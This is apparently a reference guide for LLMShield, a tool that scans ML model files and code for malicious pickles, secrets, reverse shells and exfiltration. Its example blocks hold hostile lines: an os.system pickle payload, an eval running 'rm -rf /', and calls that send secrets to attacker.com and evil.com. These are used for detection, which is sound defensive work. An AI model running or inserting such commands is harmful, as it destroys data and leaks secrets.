# Scanner Reference Guide

## Overview

LLMShield includes 9 specialized security scanners, each designed to detect specific types of vulnerabilities in ML models and code files.

## Available Scanners

### 1. PickleScanner

**Purpose**: Detects dangerous pickle opcodes that can execute arbitrary code

**Detects**:
- `GLOBAL` opcode (can import any module)
- `REDUCE` opcode (can call any callable)
- `BUILD`, `INST`, `OBJ` opcodes
- Dangerous module imports (os, subprocess, socket)

**Supported Formats**: `.pkl`, `.pickle`, `.pt`, `.pth`, `.bin`, `.model`, `.sav`

**Example Vulnerabilities**:
```python
# Dangerous pickle that executes os.system
import pickle
pickle.dumps(lambda: __import__('os').system('malicious_command'))
```

**Severity Levels**:
- CRITICAL: GLOBAL, REDUCE, INST, STACK_GLOBAL
- HIGH: BUILD, OBJ, NEWOBJ
- MEDIUM: EXT1, EXT2, EXT4

### 2. PatternScanner

**Purpose**: Matches known vulnerability patterns from database

**Detects**:
- Known malicious model signatures
- CVE patterns
- Framework-specific vulnerabilities
- Suspicious code patterns

**Supported Formats**: All formats

**Example Patterns**:
- EICAR test signatures
- Known malware hashes
- Suspicious model names
- Vulnerability database matches

### 3. CodeScanner

**Purpose**: Detects dangerous functions and code execution patterns

**Detects**:
- `eval()`, `exec()` calls
- `__import__()` dynamic imports
- `compile()` function usage
- Lambda functions with executable code
- Base64 encoded payloads

**Supported Formats**: All formats

**Example Vulnerabilities**:
```python
# Dangerous code execution
eval("__import__('os').system('rm -rf /')")
exec(base64.b64decode(encoded_payload))
```

### 4. SignatureScanner

**Purpose**: Signature-based detection of known malicious patterns

**Detects**:
- Known malware signatures
- Reverse shell patterns
- Cryptomining signatures
- Data exfiltration patterns
- Persistence mechanisms

**Supported Formats**: `.pkl`, `.pth`, `.pt`, `.h5`, `.pb`, `.onnx`

**Signature Categories**:
- Known Malware (EICAR, specific hashes)
- Reverse Shells (netcat, bash, python)
- Cryptomining (stratum protocols, miner names)
- Persistence (crontab, bashrc modifications)

### 5. AnomalyScanner

**Purpose**: Detects structural anomalies in model files

**Detects**:
- Excessive nesting depth (>10 levels)
- Unusual object types
- Oversized attributes
- Non-standard layer configurations
- Suspicious metadata

**Supported Formats**: All ML model formats

**Anomaly Types**:
- Structural irregularities
- Size anomalies
- Type mismatches
- Unexpected attributes

### 6. ExfiltrationScanner

**Purpose**: Identifies potential data theft attempts

**Detects**:
- Network communication code
- HTTP/HTTPS requests
- Socket connections
- File upload patterns
- External API calls

**Supported Formats**: All formats

**Example Patterns**:
```python
# Data exfiltration attempts
requests.post("http://attacker.com", data=sensitive_data)
urllib.request.urlopen(f"http://evil.com?data={secrets}")
socket.socket().connect(("attacker.com", 9999))
```

### 7. EntropyScanner

**Purpose**: Detects obfuscated or encrypted content

**Detects**:
- High entropy strings (>4.5 Shannon entropy)
- Base64 encoded content
- Encrypted payloads
- Obfuscated code
- Compressed data

**Supported Formats**: All formats

**Entropy Thresholds**:
- High: >4.5 (likely encrypted/obfuscated)
- Medium: 3.5-4.5 (possibly encoded)
- Low: <3.5 (normal text/code)

### 8. SecretScanner

**Purpose**: Detects hardcoded credentials and secrets

**Detects**:
- API keys (AWS, Google, GitHub, OpenAI, etc.)
- Passwords and tokens
- Private keys (RSA, SSH, PGP)
- Database credentials
- JWT tokens
- Webhook URLs

**Supported Formats**: All text-based formats including:
- Code files (`.py`, `.js`, `.java`, etc.)
- Config files (`.json`, `.yaml`, `.env`, etc.)
- Model files with embedded metadata

**Example Detections**:
```python
# Hardcoded secrets
AWS_KEY = "AKIAIOSFODNN7EXAMPLE"
github_token = "ghp_1234567890abcdefghijklmnopqrstuvwxyz"
api_key = "sk-1234567890abcdefghijklmnopqrstuvwxyz"
password = "SuperSecretPassword123!"
```

**Detection Rules**: 600+ patterns in `config/detection_rules.yaml`

### 9. PyTorchAttributeScanner

**Purpose**: PyTorch-specific security scanning

**Detects**:
- Suspicious model attributes
- Embedded secrets in state_dict
- Dangerous PyTorch-specific patterns
- Custom objects with executable code
- Malicious tensor content

**Supported Formats**: `.pt`, `.pth`, `.ckpt` (PyTorch files)

**Specific Checks**:
- State dict key analysis
- Metadata scanning
- Custom layer detection
- Tensor content analysis
- Optimizer state inspection

## Scanner Selection

### Using Specific Scanners

```bash
# Single scanner
llmshield scan model.pkl --scanners PickleScanner

# Multiple scanners
llmshield scan model.pth --scanners SecretScanner,PyTorchAttributeScanner

# All scanners (default)
llmshield scan model.pkl
```

### Recommended Scanner Combinations

#### For Pickle Files
```bash
llmshield scan model.pkl --scanners PickleScanner,CodeScanner,SignatureScanner
```

#### For Source Code
```bash
llmshield scan app.py --scanners SecretScanner,CodeScanner,PatternScanner
```

#### For PyTorch Models
```bash
llmshield scan model.pth --scanners PyTorchAttributeScanner,SecretScanner,AnomalyScanner
```

#### For Unknown Files
```bash
# Use all scanners for comprehensive analysis
llmshield scan unknown_file --scanners all
```

## Severity Levels

Each scanner assigns severity levels to detected vulnerabilities:

| Level | Score | Description | Action Required |
|-------|-------|-------------|-----------------|
| CRITICAL | 9-10 | Immediate threat, code execution | Do not use, quarantine immediately |
| HIGH | 7-8 | Significant risk, data exposure | Review and remediate before use |
| MEDIUM | 4-6 | Potential risk, suspicious patterns | Investigate and assess risk |
| LOW | 1-3 | Minor issues, best practices | Consider fixing, monitor |
| INFO | 0-1 | Informational findings | No immediate action required |

## Scanner Output

Each scanner provides detailed information:

```json
{
  "scanner_name": "SecretScanner",
  "vulnerability": {
    "severity": "CRITICAL",
    "category": "secrets",
    "description": "AWS Access Key Detected",
    "file_path": "config.py",
    "line_number": 23,
    "evidence": {
      "pattern": "AKIA[A-Z0-9]{16}",
      "matched_value": "AKIA****************",
      "context": "aws_key = \"AKIA...\""
    },
    "remediation": "Remove hardcoded AWS credentials. Use environment variables or IAM roles instead.",
    "confidence": 0.95
  }
}
```

## Custom Detection Rules

Add custom patterns to `config/detection_rules.yaml`:

```yaml
secrets:
  custom_api_key:
    name: "Custom API Key"
    enabled: true
    patterns:
      - "CUSTOM_[A-Z0-9]{32}"
    severity: "HIGH"
    description: "Detected custom API key pattern"
    remediation: "Store API keys in environment variables"
    tags: ["api", "custom"]
```

## Performance Considerations

1. **PickleScanner**: Fast, low memory usage
2. **PatternScanner**: Speed depends on pattern count
3. **CodeScanner**: Moderate speed, regex-based
4. **SignatureScanner**: Fast signature matching
5. **AnomalyScanner**: Can be slow on deeply nested structures
6. **ExfiltrationScanner**: Fast pattern matching
7. **EntropyScanner**: Moderate, performs calculations
8. **SecretScanner**: Speed varies with file size
9. **PyTorchAttributeScanner**: Slower, loads model data

## Best Practices

1. **Start with relevant scanners** for faster results
2. **Use SecretScanner** for all code and config files
3. **Always use PickleScanner** for pickle files
4. **Enable AI enrichment** for unknown patterns
5. **Review CRITICAL and HIGH** severity findings first
6. **Update detection rules** regularly
7. **Test scanners** on known malicious samples
8. **Monitor scan performance** on large files